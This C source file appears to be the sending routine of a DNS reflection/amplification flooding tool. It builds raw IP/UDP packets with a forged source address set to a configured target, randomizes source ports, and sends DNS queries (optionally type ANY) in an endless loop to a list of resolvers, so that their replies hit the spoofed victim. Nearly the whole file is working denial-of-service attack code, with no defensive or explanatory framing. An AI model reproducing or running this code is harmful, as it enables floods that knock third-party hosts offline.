#include <stdio.h>
#include "dns.h"
#include "config.h"
#include "utils.h"
#include "logger.h"

Configuration config;

void    dns_send();

// Taken from http://www.binarytides.com/raw-udp-sockets-c-linux/
unsigned short
csum(unsigned short *ptr, int nbytes)
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum = 0;
	while(nbytes > 1) {
		sum += *ptr++;
		nbytes -= 2;
	}
	if(nbytes == 1) {
		oddbyte = 0;
		*((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);
	answer = (short)~sum;

	return (answer);
}

// Taken from http://www.binarytides.com/dns-query-code-in-c-with-linux-sockets/
void
dns_format(unsigned char *dns, unsigned char *host)
{
	int     lock = 0, i;
	strcat((char *)host, ".");
	for(i = 0; i < strlen((char *)host); i++) {
		if(host[i] == '.') {
			*dns++ = i - lock;
			for(; lock < i; lock++) {
				*dns++ = host[lock];
			}
			lock++;
		}
	}
	*dns++ = 0x00;
}

// Creates the dns header and packet
void
dns_hdr_create(dns_hdr * dns)
{
	dns->id = (unsigned short)htons(getpid());
	dns->flags = htons(0x0100);
	dns->qcount = htons(1);
	dns->ans = 0;
	dns->auth = 0;
	dns->add = 0;
}

int
get_qtype(const char *type)
{
	if(strcasecmp("any", type) == 0)
		return 0xff;
	if(strcasecmp("a", type) == 0)
		return 0x01;
	if(strcasecmp("cname", type) == 0)
		return 0x05;
	return 0x01;
}

void
dns_send()
{
// Building the DNS request data packet

	unsigned char dns_data[128];
	unsigned char *domain = NULL;
	char   *dns_srv = NULL;
	char   *trgt_ip = NULL;
	int     dns_p = 53;	//默认53口
	int     trgt_p = 0;
	int     interval = 0;
	char    dns_srv_ips[32][16];
	char    dns_srv_ip[16];
	char   *p;
	char   *buff;

	unsigned char *dns_name, dns_rcrd[32];
// Building the IP and UDP headers
	char    datagram[4096], *data, *psgram;
	memset(datagram, 0, 4096);
	int     sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	interval = config.dns_interval < 10 ? 10 : config.dns_interval;
	dns_srv = (char *)config.dns_targetip;

	buff = dns_srv;
	p = strsep(&buff, ",");
	int     dns_srv_ips_len = 0;
	while(p) {
		strcpy(dns_srv_ips[dns_srv_ips_len], p);
		p = strsep(&buff, ",");
		++dns_srv_ips_len;
	}
	log_debug(logger, "[%s] %s => %s in %d", config.dns_domain,
		  config.dns_sourceip, dns_srv, interval);

	unsigned int ippos = 0;
	while(1) {
		domain = replace_domain(config.dns_domain, "*");
		if(ippos >= dns_srv_ips_len)
			ippos = 0;

		strcpy(dns_srv_ip, dns_srv_ips[ippos]);
		++ippos;
		trgt_ip = replace_ip(config.dns_sourceip, "*");
		trgt_p = random_int(1000, 65535);

		log_debug(logger,
			  "trgt_ip=%s,trgt_p=%d,dns_srv=%s,dns_p=%d,domain=%s",
			  trgt_ip, trgt_p, dns_srv_ip, dns_p, domain);

		dns_hdr *dns = (dns_hdr *) & dns_data;
		dns_hdr_create(dns);

		dns_name = (unsigned char *)&dns_data[sizeof(dns_hdr)];
		strcpy(dns_rcrd, domain);
		dns_format(dns_name, dns_rcrd);

		query  *q;
		q = (query *) & dns_data[sizeof(dns_hdr) +
					 (strlen(dns_name) + 1)];
		q->qtype = htons(get_qtype(config.dns_type));	//0x00ff=any, 0x01=a,0x05=cname
		q->qclass = htons(0x1);


		data = datagram + sizeof(iph) + sizeof(udph);
		memcpy(data, &dns_data,
		       sizeof(dns_hdr) + (strlen(dns_name) + 1) +
		       sizeof(query) + 1);

		struct sockaddr_in sin;
		sin.sin_family = AF_INET;
		sin.sin_port = htons(dns_p);
		sin.sin_addr.s_addr = inet_addr(dns_srv_ip);

		iph    *ip = (iph *) datagram;
		ip->version = 4;
		ip->ihl = 5;
		ip->tos = 0;
		ip->tot_len =
			sizeof(iph) + sizeof(udph) + sizeof(dns_hdr) +
			(strlen(dns_name) + 1) + sizeof(query);
		ip->id = htonl(getpid());
		ip->frag_off = 0;
		ip->ttl = 64;
		ip->protocol = IPPROTO_UDP;
		ip->check = 0;
		ip->saddr = inet_addr(trgt_ip);
		ip->daddr = sin.sin_addr.s_addr;
		ip->check = csum((unsigned short *)datagram, ip->tot_len);

		udph   *udp = (udph *) (datagram + sizeof(iph));
		udp->source = htons(trgt_p);
		udp->dest = htons(dns_p);
		udp->len =
			htons(8 + sizeof(dns_hdr) + (strlen(dns_name) + 1) +
			      sizeof(query));
		udp->check = 0;

// Pseudoheader creation and checksum calculation
		ps_hdr  pshdr;
		pshdr.saddr = inet_addr(trgt_ip);
		pshdr.daddr = sin.sin_addr.s_addr;
		pshdr.filler = 0;
		pshdr.protocol = IPPROTO_UDP;
		pshdr.len =
			htons(sizeof(udph) + sizeof(dns_hdr) +
			      (strlen(dns_name) + 1) + sizeof(query));

		int     pssize =
			sizeof(ps_hdr) + sizeof(udph) + sizeof(dns_hdr) +
			(strlen(dns_name) + 1) + sizeof(query);
		psgram = malloc(pssize);

		memcpy(psgram, (char *)&pshdr, sizeof(ps_hdr));
		memcpy(psgram + sizeof(ps_hdr), udp,
		       sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) +
							 1) + sizeof(query));

		udp->check = csum((unsigned short *)psgram, pssize);

// Send data
		if(sd == -1)
			printf("Could not create socket.\n");
		else
			sendto(sd, datagram, ip->tot_len, 0,
			       (struct sockaddr *)&sin, sizeof(sin));
		free(domain);
		free(psgram);
		free(trgt_ip);
		usleep(interval);
	}
	close(sd);

	return;

}
